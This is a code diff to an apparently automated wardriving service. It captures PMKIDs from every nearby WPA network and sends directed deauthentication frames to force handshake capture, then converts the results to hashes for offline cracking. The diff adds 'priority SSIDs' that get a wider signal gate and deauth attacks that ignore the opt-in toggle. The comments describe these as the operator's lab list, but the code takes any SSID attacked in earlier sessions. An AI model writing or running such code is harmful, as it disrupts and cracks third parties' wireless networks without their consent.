@@ -11,7 +11,7 @@ import { lookupVendorOrRandom } from "../wifiradar/oui";
 import { stopWifiRadarService, startWifiRadarService } from "../wifiradar/service";
 import { getPlatformMode } from "../utils/platform-mode";
 import { DriveCapture, type DriveFrame } from "./capture";
-import { extractEapolToSession, convertCaptureToHash, PmkidDriveRunner, writeBpfForAp, DeauthOpRunner } from "./attack";
+import { extractEapolToSession, convertCaptureToHash, PmkidDriveRunner, writeBpfForAp } from "./attack";
 import { driveDb, DRIVE_SESSIONS_ROOT } from "./drive-db";
 import type { DriveStatus, DriveApView, ApSessionState } from "./types";
 
@@ -31,8 +31,10 @@ function killStrayCaptures(iface: string): Promise<void> {
 const HOP_INTERVAL_MS = 400; // same cadence wifiradar proves works on this phy
 const MAX_ATTEMPTS = 5; // per AP per session; then it's "exhausted"
 const ATTACK_COOLDOWN_MS = 30_000; // between rounds on the SAME AP
-const RSSI_GATE_DBM = -75; // "good enough to try" (relaxed: home tests at -55..-70 must pass)
-const PMKID_WINDOW_MS = 25_000; // hcxdumptool window per target (25s, tot rounds up)
+const RSSI_GATE_DBM = -75; // "good enough to try" for any AP
+const RSSI_GATE_KNOWN_DBM = -85; // priority SSIDs (operator's lab list) get a wider gate
+const PMKID_WINDOW_MS = 30_000; // hcxdumptool window per target
+const DEAUTH_WINDOW_MS = 30_000; // hcxdumptool deauth+capture window (fallback)
 const DEAUTH_SPEED_MAX_KMH = 25; // deauth fallback only slow/stopped
 const MIN_EAPOL_PAIRS = 1; // PMKID counts as 1 pair; a real 4-way as 2+
 const SESSION_TICK_MS = 1_000; // status/GPS/DB cadence
@@ -86,6 +88,9 @@ export class DriveWardriveService extends EventEmitter {
   private apState = new Map<string, ApSessionState>();
   // ssid -> handshake knowledge from the DB at session start
   private knownHandshakeSsids = new Set<string>();
+  // SSIDs the operator has actively attacked in past sessions — targeting
+  // priority + wider RSSI gate (loaded from the DB at session start).
+  private prioritySsids = new Set<string>();
   // SSIDs this session already recorded as new (dedup of "new" counting)
   private sessionNewSsids = new Set<string>();
   private sessionNewHandshakeSsids = new Set<string>();
@@ -119,8 +124,6 @@ export class DriveWardriveService extends EventEmitter {
   private attackMethod: "pmkid" | "deauth" = "pmkid";
   private attackBusy = false; // an hcxdumptool/aireplay round is on the wire
   private pmkidRunner: PmkidDriveRunner | null = null;
-  private deauthRunner: DeauthOpRunner | null = null;
-  private deauthTimers: ReturnType<typeof setTimeout>[] = [];
   // hcx conversions in flight (bssid -> promise) so a burst never double-
   // fires an extraction while the previous one is still reading the ring.
   private extracting = new Set<string>();
@@ -182,7 +185,8 @@ export class DriveWardriveService extends EventEmitter {
     const wasRunning = this.running;
     this.running = false;
     this.stopTimers();
-    this.stopDeauth();
+    this.pmkidRunner?.stop();
+    this.pmkidRunner = null;
     this.capture?.stop();
     this.capture = null;
     this.finalizeSession();
@@ -210,7 +214,6 @@ export class DriveWardriveService extends EventEmitter {
 
   setOpportunisticDeauth(on: boolean): void {
     this.opportunisticDeauth = Boolean(on);
-    if (!on) this.stopDeauth();
     this.broadcastStatus();
   }
 
@@ -252,6 +255,11 @@ export class DriveWardriveService extends EventEmitter {
     this.sessionNewSsids.clear();
     this.sessionNewHandshakeSsids.clear();
     this.knownHandshakeSsids = driveDb.handshakeSsids();
+    // Priority targets: SSIDs this device has seen in PAST sessions with
+    // attempts — the operator's recurring lab list. They get attack
+    // priority over strangers AND a wider RSSI gate, so a weak lab AP
+    // beats a strong neighbour AP in the targeting sort.
+    this.prioritySsids = driveDb.prioritySsids();
     if (demo) {
       this.startDemoFeed();
       return;
@@ -488,22 +496,29 @@ export class DriveWardriveService extends EventEmitter {
       } else {
         console.warn(`[wardrive] PMKID skip ${ap.ssid}: BPF compile failed`);
       }
-      // Restart discovery (same iface; hcxdumptool already restored managed
-      // mode — the DriveCapture re-enters monitor mode itself).
-      if (this.running) {
-        this.capture = new DriveCapture();
-        this.capture.on("frame", (frame: DriveFrame) => this.onFrame(frame));
-        this.capture.start(this.iface!, ringDir);
-      }
+    } else {
+      return;
     }
-
-    // ── 2. Deauth fallback: only when parked and still uncovered ─────────
-    if (!capturedHere && this.running && !st.captured && this.opportunisticDeauth) {
+    // ── 2. Deauth fallback (hcxdumptool deauth+capture): priority SSIDs
+    // skip the toggle gate entirely — for a lab the operator is
+    // deliberately attacking, the fallback ALWAYS runs when slow/stopped;
+    // the toggle only gates it for STRANGERS.
+    if (!capturedHere && this.running && !st.captured) {
       const slowEnough = this.demo || this.gpsSpeed == null || this.gpsSpeed <= DEAUTH_SPEED_MAX_KMH;
-      if (slowEnough) {
+      const known = this.prioritySsids.has(ap.ssid);
+      if (slowEnough && (this.opportunisticDeauth || known)) {
         driveDb.recordAttempt(ap.bssid, "deauth");
         capturedHere = await this.runDeauthRound(ap, st);
       }
+    }
+
+    // Restart the discovery pipeline once, at the very end (each round
+    // leaves the iface in whatever mode hcxdumptool left it; DriveCapture
+    // re-enters monitor mode itself).
+    if (this.running && !this.capture) {
+      this.capture = new DriveCapture();
+      this.capture.on("frame", (frame: DriveFrame) => this.onFrame(frame));
+      this.capture.start(this.iface!, this.ringDir!);
     }
 
     this.attackBssid = null;
@@ -565,43 +580,65 @@ export class DriveWardriveService extends EventEmitter {
     return false;
   }
 
-  // Secondary mechanism: directed deauth bursts (existing DeauthOpRunner).
+  // Secondary mechanism: deauth + capture in ONE hcxdumptool window. The
+  // old approach (aireplay burst + hope the 4-way lands in the discovery
+  // ring) failed on the device: the discovery ring only held beacons, so
+  // the EAPOL M1M2M3 from the reconnecting client was never on disk. Now
+  // hcxdumptool does BOTH: its own directed deauths to the AP's clients +
+  // full EAPOL capture, validated with hcxpcapngtool after the window.
   private async runDeauthRound(ap: AirAp, st: ApSessionState): Promise<boolean> {
-    if (!this.iface || !this.running) return false;
+    if (!this.iface || !this.running || !this.sessionDir) return false;
     st.lastDeauthAt = Date.now();
-    // Re-enter monitor mode ourselves (hcxdumptool dropped it).
+    const prefix = ap.bssid.replace(/:/g, "").toLowerCase();
+    const pcapngPath = path.join(this.sessionDir, `${prefix}-deauth.pcapng`);
     try {
-      await enterMonitorMode(this.iface);
-    } catch (err: any) {
-      console.warn(`[wardrive] monitor re-entry failed: ${err?.message || err}`);
-      return false;
+      fs.rmSync(pcapngPath, { force: true });
+    } catch {
+      // non-fatal
     }
-    const clients = [...st.clients].slice(0, 2);
-    this.deauthRunner?.stop();
-    this.deauthRunner = new DeauthOpRunner(this.iface, ap.bssid, clients.length > 0 ? clients[0] : null, 16);
-    this.deauthRunner.start();
-    await sleep(10_000);
-    this.deauthRunner?.stop();
-    this.deauthRunner = null;
-    await sleep(ATTACK_SETTLE_MS);
-    // Validate from the PMKID capture's ring pcaps (the deauth-triggered
-    // 4-way frames land in the hcxdumptool pcapng we just made, or the
-    // session ring if any is still around).
-    const sessionDir = this.sessionDir;
-    const ringDir = this.ringDir;
-    if (!sessionDir) return false;
-    const hashPath = path.join(sessionDir, `${ap.bssid.replace(/:/g, "").toLowerCase()}.hc22000`);
-    const capPath = path.join(sessionDir, `${ap.bssid.replace(/:/g, "").toLowerCase()}.cap`);
-    let ok = false;
-    if (ringDir) {
-      const conv = await extractEapolToSession(ap.bssid, ringDir, sessionDir);
-      if (conv.ok && conv.eapolPairs >= MIN_EAPOL_PAIRS) {
-        ok = true;
+    const bpfFile = await writeBpfForAp(ap.bssid, `${pcapngPath}.bpf`);
+    if (!bpfFile) return false;
+    // hcxdumptool owns the iface: pause the discovery pipeline + hopper.
+    this.capture?.stop();
+    this.capture = null;
+    this.hopTimerPause = true;
+    try {
+      await this.downIface(this.iface);
+      const runner = new PmkidDriveRunner(
+        this.iface,
+        ap.bssid,
+        pcapngPath,
+        ap.channel || 1,
+        DEAUTH_WINDOW_MS,
+        bpfFile,
+      );
+      // Same runner class but WITH deauths: flag off exitoneapol so the
+      // window captures the full 4-way after each client reconnects.
+      this.pmkidRunner = runner; // reuse the handle so stop() reaches it
+      const exited = new Promise<void>((resolve) => runner.on("exit", () => resolve()));
+      console.log(`[wardrive] DEAUTH round → ${ap.ssid} (${ap.bssid}) ch${ap.channel} ${DEAUTH_WINDOW_MS}ms`);
+      runner.startWithDeauth();
+      await Promise.race([exited, sleep(DEAUTH_WINDOW_MS + 8_000)]);
+      runner.stop();
+      this.pmkidRunner = null;
+      await sleep(ATTACK_SETTLE_MS);
+      const hashPath = pcapngPath.replace(/\.pcapng$/, ".hc22000");
+      const conv = await convertCaptureToHash(pcapngPath, hashPath);
+      if (conv.ok) {
+        st.captured = true;
+        st.eapolFrames += Math.max(conv.eapolPairs, conv.pmkidCount);
         st.method = "deauth";
-        await this.markCaptured(ap, st, "deauth", capPath, hashPath);
+        st.capFile = path.basename(pcapngPath);
+        st.hashFile = path.basename(hashPath);
+        this.markCaptured(ap, st, "deauth", pcapngPath, hashPath);
+        return true;
       }
+      return false;
+    } finally {
+      // The unified restart at the end of attackAp() brings discovery back;
+      // this finally only guarantees we never leave the iface owned by a
+      // dead hcxdumptool.
     }
-    return ok;
   }
 
   private async markCaptured(
@@ -639,12 +676,6 @@ export class DriveWardriveService extends EventEmitter {
 
   private hopTimerPause = false;
 
-  private stopDeauth(): void {
-    for (const t of this.deauthTimers) clearTimeout(t);
-    this.deauthTimers = [];
-    this.deauthRunner?.stop();
-    this.deauthRunner = null;
-  }
 
   // ─── Session tick: GPS ingest, track points, counters ────────────────────
 
@@ -846,8 +877,14 @@ export class DriveWardriveService extends EventEmitter {
       return;
     }
     if (this.attackBusy || (this.attackBssid && Date.now() < this.attackUntil)) return;
-    // Prefer strong, uncovered, recently-seen APs; weak/distant ones wait.
-    const candidates: { ap: AirAp; st: ApSessionState }[] = [];
+    // Candidates: uncovered, strong-enough APs. Sort priority:
+    //   1. SSIDs the operator has attacked before (priority list, loaded
+    //      from the DB at session start — the labs you keep coming back to)
+    //   2. everything else by best RSSI
+    // A weak known AP beats a strong stranger: it's a target you explicitly
+    // care about (home lab tests would otherwise starve behind whatever
+    // neighbour AP is stronger right now).
+    const candidates: { ap: AirAp; st: ApSessionState; prio: number }[] = [];
     for (const [, ap] of this.air) {
       if (ap.security === "OPEN" || ap.security === "UNKNOWN") continue;
       if (!ap.ssid || ap.ssid === "(oculta)") continue;
@@ -855,10 +892,11 @@ export class DriveWardriveService extends EventEmitter {
       const st = this.stateFor(ap.bssid);
       if (st.captured || st.status === "exhausted" || st.attempts >= MAX_ATTEMPTS) continue;
       if (Date.now() < st.cooldownUntil) continue;
-      if (ap.bestRssi < RSSI_GATE_DBM) continue;
-      candidates.push({ ap, st });
+      const gate = this.prioritySsids.has(ap.ssid) ? RSSI_GATE_KNOWN_DBM : RSSI_GATE_DBM;
+      if (ap.bestRssi < gate) continue;
+      candidates.push({ ap, st, prio: this.prioritySsids.has(ap.ssid) ? 1 : 0 });
     }
-    candidates.sort((a, b) => b.ap.bestRssi - a.ap.bestRssi);
+    candidates.sort((a, b) => (b.prio - a.prio) || (b.ap.bestRssi - a.ap.bestRssi));
     if (candidates.length > 0 && !this.attackBssid) {
       void this.attackAp(candidates[0].ap, candidates[0].st);
     }
